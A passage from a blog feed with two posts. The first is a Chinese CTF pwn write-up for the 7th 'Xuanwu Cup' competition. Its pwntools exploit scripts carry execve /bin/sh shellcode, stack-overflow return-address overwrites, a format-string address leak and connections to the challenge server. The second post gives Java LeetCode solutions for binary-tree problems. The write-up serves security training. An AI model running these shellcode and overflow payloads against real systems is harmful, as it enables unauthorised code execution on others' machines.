        <content type="html"><![CDATA[<h4 id="CUDSEC——第七届”玄武杯”Pwn方向WP"><a href="#CUDSEC——第七届”玄武杯”Pwn方向WP" class="headerlink" title="CUDSEC——第七届”玄武杯”Pwn方向WP"></a>CUDSEC——第七届”玄武杯”Pwn方向WP</h4><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h3><p>签到题没什么好说的 flag写在程序里 拖进IDA秒.</p><h3 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h3><p>算加强版签到了 运行程序看到<br><img src="/../imgs/2024-10/image-20241109125426328.png" alt="image-20241109125426328"></p><p>提示给了shell 那是提供了后门的（进IDA分析也能看到）<br>直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/../imgs/2024-10/image-20241109125715321.png" alt="image-20241109125715321"></p><p>打远程加上flag查看就好了.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p>如果说为什么出这个感觉不沾边 问就是之前给新同学们布置过相关学习任务 考察一下（欢迎非预期的佬们交流~</p><h3 id="only-chance"><a href="#only-chance" class="headerlink" title="only_chance"></a>only_chance</h3><p>这题有学弟卡在第二次地址接收 其实主要还是栈的工作原理理解的不是特别透彻（反思ing</p><p>运行其实就有提示没有后门怎么搞 八成要自己构造shellcode多打几次<br>IDA分析发现gets s的大小是280 这里就可以利用栈溢出重定向到main进行第二次程序运行执行shellcode<br>使用NOP sled确保在返回到 shellcode 时，即使位置偏移，程序也会“滑行”到有效的指令区域（2048也111）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;arm64&#x27;</span>, os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">1</span></span><br><span class="line">offset = <span class="number">280</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] main_addr:&#x27;</span>, <span class="built_in">hex</span>(main))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] offest:&#x27;</span>, <span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload1， ret到main头，获取第二次输入机会</span></span><br><span class="line">payload1 = offset * <span class="string">b&#x27;a&#x27;</span> + p64(main)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"><span class="comment"># = remote(&#x27;127.0.0.1&#x27;,8888)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;where are them\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取栈顶地址</span></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;[+] stack:&#x27;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span>   <span class="comment"># 先填充nop链</span></span><br><span class="line">payload2 += shellcode       <span class="comment"># 执行shellcode</span></span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="built_in">len</span>(shellcode) - <span class="number">0x50</span>)     <span class="comment"># 填充完剩余栈区</span></span><br><span class="line">payload2 += p64(stack)      <span class="comment"># ret: 回到栈顶，开始执行</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也有师傅是shellcode接受栈地址 然后控制程序流执行到shellcode 就可以拿到shell了 比我这个精简多了.下附R师傅的思路.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process(&#x27;./one_chance&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">49494</span>)</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./one_chance&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401463</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(<span class="number">0x404500</span>)+p64(ret)+p64(<span class="number">0x401360</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(stack))</span><br><span class="line">shell=shellcraft.sh()</span><br><span class="line">shell=asm(shell)</span><br><span class="line">payload=shell.ljust(<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>如果你是2048高手 那这题真的就是送了 但是感觉有点遗憾 没有很多师傅的反馈呜呜（也可能是有些师傅觉得太easy不屑一顾hh 🤩<br>其实主要是一个非预期填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xt.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./p2048&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">22770</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;z&#x27;</span> * (<span class="number">1024</span> + <span class="number">28</span>)  + <span class="string">b&#x27;\n&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;w&#x27;</span><span class="comment">#非预期填充</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>Hint是栈和格式化字符串 需要debug<br>貌似这题存在些疑问 希望有问题的师傅可以下来一起交流（lose 我是菜菜fw</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,40454)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x10</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x10/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x10/</url>
      
        <content type="html"><![CDATA[<h4 id="二叉树的层序遍历（广度优先遍历）"><a href="#二叉树的层序遍历（广度优先遍历）" class="headerlink" title="二叉树的层序遍历（广度优先遍历）"></a>二叉树的层序遍历（广度优先遍历）</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/description/">102. 二叉树的层序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目说明从左往右进行遍历，其实可以堪称给二叉树每一层都画横线分割开来，left first，right last.</p><p><img src="/../imgs/2024-10/image-20241108151829868.png" alt="image-20241108151829868"></p><p>n代表null 输出只从存在的节点中输出.<br>最先想到的就是递归，按照创建树的思路，pass掉空节点就好.<br>先前做过队列模拟栈，其实这里用队列来解决也很优雅.</p><h6 id="队列BFS"><a href="#队列BFS" class="headerlink" title="队列BFS"></a>队列BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//获取当前队列的大小</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                tmp.add(cur.val);</span><br><span class="line">                size--;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>高度:二叉树中任意一个节点到叶子结点的距离<br>深度:二叉树中任意一个节点到<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E8%8A%82%E7%82%B9&spm=1001.2101.3001.7020">根节点</a>的距离</p><p><strong><code>List&lt;List&lt;Integer&gt;&gt;</code> 的必要性</strong></p><p>每一层的节点值需要单独存储在一个列表中，然后将所有层的列表整合在一个大列表中。因此，最终结果需要一个嵌套的列表结构。</p><h4 id="反转二叉树"><a href="#反转二叉树" class="headerlink" title="反转二叉树"></a>反转二叉树</h4><p>link：<a href="https://leetcode.cn/problems/invert-binary-tree/description/">226. 翻转二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题意，看到的是左右子树内部交换自身孩子节点，然后左右子树又进行了交换.<br>递归交换就秒了.<br>其实可以老老实实的逐个左右交换，也可以按照上一题层序遍历的一层层交换（观察到最后一层是1，3，6，9——&gt;9，6，3，1）</p><h6 id="DFS（递归）"><a href="#DFS（递归）" class="headerlink" title="DFS（递归）"></a>DFS（递归）</h6><p>注意前序遍历和后序遍历可以，中序遍历不行（不信你就画图推推看）<br>前序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left= root.right ;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 后序遍历：先递归地翻转左右子树</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> invertTree(root.left);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> invertTree(root.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 交换左右子树</span></span><br><span class="line">        root.left = right;</span><br><span class="line">        root.right = left;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;deque.offer(node.left);&#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;deque.offer(node.right);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p>人机有话说.<br><strong>DFS 和 BFS 的区别</strong></p><ol><li><strong>遍历顺序</strong><ul><li><strong>DFS（Depth First Search，深度优先搜索）</strong>：优先深入到每个节点的子节点，通常会先访问到某个分支的最底层节点，然后再回溯到上层节点去访问其他分支。常见的 DFS 实现有三种：前序遍历（Preorder）、中序遍历（Inorder）、后序遍历（Postorder）。</li><li><strong>BFS（Breadth First Search，广度优先搜索）</strong>：优先访问每一层的节点，然后再逐层深入。BFS 一般使用队列（<code>Queue</code>）来实现，按层次逐一处理节点。</li></ul></li><li><strong>数据结构</strong><ul><li><strong>DFS</strong>：常用递归或栈来实现，递归会隐式使用系统栈，而非递归的实现需要显式的栈。</li><li><strong>BFS</strong>：通常使用队列来实现，因为它按照层次顺序访问节点。</li></ul></li><li><strong>时间复杂度和空间复杂度</strong><ul><li><strong>时间复杂度</strong>：DFS 和 BFS 的时间复杂度都是 O(n)，其中 nnn 是节点的数量，因为每个节点都需要被访问一次。</li><li><strong>空间复杂度</strong>：DFS 的空间复杂度取决于递归的深度，最坏情况下是 O(h)（树的高度）；BFS 的空间复杂度则是 O(w)，其中 w是树的最大宽度。</li></ul></li></ol><h4 id="对称二叉树"><a href="#对称二叉树" class="headerlink" title="对称二叉树"></a>对称二叉树</h4><p>link：<a href="https://leetcode.cn/problems/symmetric-tree/description/">101. 对称二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目确实觉得很对称啊，看图分析左子树和右子树的遍历顺序，左子树是左右中，那和右子树比较的时候就是右左中.<br>特殊情况优先考虑<br>左空右空-&gt;true<br>左不空右空-&gt;false<br>左空右不空-&gt;false<br>那最后的情况就是左右都不为空了，这时候就需要单独判断.<br>单侧不对称就可以返回false.<br>那么这么比较就只能是后序遍历了.<br>递归秒！</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cmp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">cmp</span><span class="params">(TreeNode left,TreeNode right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right.val != left.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">last</span> <span class="operator">=</span> cmp(left.left,right.right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lastnext</span> <span class="operator">=</span> cmp(left.right,right.left);</span><br><span class="line">        <span class="keyword">return</span> last &amp;&amp; lastnext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>不要else if判断结束之后直接else{return true;}<br>这样做的话没有判断其他剩余的子节点 ，意味着中层节点的值心相等，但是叶子节点的值不通，但仍然判断这种情况为true，这样是不对的.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x1</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x1/"/>
